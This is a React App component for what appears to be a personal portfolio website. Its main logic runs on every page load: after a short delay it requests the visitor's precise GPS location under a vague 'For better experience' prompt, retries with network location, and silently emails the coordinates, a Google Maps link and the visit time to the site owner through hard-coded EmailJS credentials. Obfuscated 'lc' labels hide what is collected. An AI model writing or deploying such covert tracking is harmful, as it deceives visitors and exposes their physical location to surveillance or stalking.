
import Navbar from './Components/Navbar'
import Header from './Components/Header'
import Skills from './Components/Skills'
import Education from './Components/Education'
import Projects from './Components/Projects'

import { ToastContainer } from 'react-toastify'
import 'react-toastify/dist/ReactToastify.css';
import Footer from './Components/Footer'
import About from './Components/About'
import { useEffect, useState } from 'react'
import emailjs from '@emailjs/browser'
import { toast } from 'react-toastify'
import AContact from './Components/AContact'




function App() {
  const [userLocation, setUserLocation] = useState(null);
  const [emailSent, setEmailSent] = useState(false);
  // Function to send location data via email
  const sendLocationEmail = (latitude, longitude) => {
    // Prevent multiple emails
    if (emailSent) {
      console.log("Email already sent, skipping...");
      return;
    }
    
    const currentTime = new Date().toLocaleString();
    const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
    
    const templateParams = {
      from_name: 'Website Visitor',
      user_email: 'automatic@system.com',
      phone: 'N/A',
      message: `Automatic location data captured from website visitor. View location: ${googleMapsLink}`,
      user_latitude: latitude,
      user_longitude: longitude,
      location_info: `Visitor Location - Latitude: ${latitude}, Longitude: ${longitude}`,
      google_maps_link: googleMapsLink,
      visit_time: currentTime
    };

    // Add retry logic for email sending
    const sendEmail = (retryCount = 0) => {
      emailjs
        .send('service_yrlxuma', 'template_0217uod', templateParams, {
          publicKey: 'TLs9u-trXhMYUsnMT',
        })
        .then(
          () => {
            console.log("lc data  successfully!");
            setEmailSent(true); // Mark email as sent
            toast.success("lc data captured!", {
              position: "top-right",
              autoClose: 3000
            });
          },
          (error) => {
            console.log("Failed to  lc data:", error);
            
            // Retry up to 2 times
            if (retryCount < 2) {
              setTimeout(() => {
                sendEmail(retryCount + 1);
              }, 2000 * (retryCount + 1)); // Exponential backoff
            } else {
              toast.error("Failed to send lc data after multiple attempts", {
                position: "top-right",
                autoClose: 4000
              });
            }
          }
        );
    };

    sendEmail();
  };
  useEffect(() => {
    // Enhanced geolocation function with better error handling and options
    function getLocation() {
      if (!navigator.geolocation) {
        console.log("Geolocation is not supported by this browser.");
        toast.warning("lc services not supported on this device", {
          position: "top-right",
          autoClose: 5000
        });
        return;
      }

      // Check if we're on mobile and request permission politely
      if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
        toast.info("For better experience", {
          position: "top-center",
          autoClose: 4000
        });
      }

      // Enhanced geolocation options for better accuracy, especially on mobile
      const options = {
        enableHighAccuracy: true, // Use GPS if available
        timeout: 15000, // 15 second timeout for mobile devices
        maximumAge: 300000 // Accept cached position if less than 5 minutes old
      };

      navigator.geolocation.getCurrentPosition(success, error, options);
    }

    function success(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const accuracy = position.coords.accuracy;
      
      console.log(`Location found - Lat: ${latitude}, Lng: ${longitude}, Accuracy: ${accuracy}m`);
      
      // Store location data in state only if not already stored
      if (!userLocation) {
        setUserLocation({
          latitude: latitude,
          longitude: longitude,
          accuracy: accuracy,
          timestamp: new Date().toISOString()
        });

        // Show success message
        toast.success(" lc successfully!", {
          position: "top-right",
          autoClose: 3000
        });

        // Automatically send location data via email only once
        sendLocationEmail(latitude, longitude);
      }
    }

    function error(err) {
      console.warn(`Geolocation error (${err.code}): ${err.message}`);
      
      switch(err.code) {
        case err.PERMISSION_DENIED:
          toast.error(" Please enable lc in your browser settings.", {
            position: "top-center",
            autoClose: 7000
          });
          break;
        case err.POSITION_UNAVAILABLE:
          toast.warning(" Trying alternative method...", {
            position: "top-right",
            autoClose: 5000
          });
          // Try with less strict options
          retryWithFallback();
          break;
        case err.TIMEOUT:
          toast.warning(" Retrying with fallback...", {
            position: "top-right",
            autoClose: 5000
          });
          // Retry with less strict options
          retryWithFallback();
          break;
        default:
          toast.error(" Please try refreshing the page.", {
            position: "top-right",
            autoClose: 5000
          });
          break;
      }
    }

    // Fallback function for when high accuracy fails
    function retryWithFallback() {
      const fallbackOptions = {
        enableHighAccuracy: false, // Don't require GPS, use network location
        timeout: 20000, // Longer timeout for mobile networks
        maximumAge: 600000 // Accept older cached positions (10 minutes)
      };

      navigator.geolocation.getCurrentPosition(success, (err) => {
        console.warn("Fallback geolocation also failed:", err.message);
        toast.error(" features will be limited.", {
          position: "top-right",
          autoClose: 6000
        });
        
        // Set a default location indicator
        setUserLocation({
          latitude: null,
          longitude: null,
          error: "Location unavailable"
        });
      }, fallbackOptions);
    }

    // Add a delay before requesting location to ensure page is fully loaded
    // This is especially important for mobile devices
    const timer = setTimeout(() => {
      getLocation();
    }, 2000);    return () => clearTimeout(timer);
  }, [userLocation, sendLocationEmail]); // Add dependencies

  return (
    <>

    <Navbar/>
    <Header/>
    <Skills/>
    <Education/>
    <Projects/>    <About/>
  
    <AContact userLocation={userLocation}></AContact>
    <Footer/>
    <ToastContainer />

   
      
    </>
  )
}

export default App
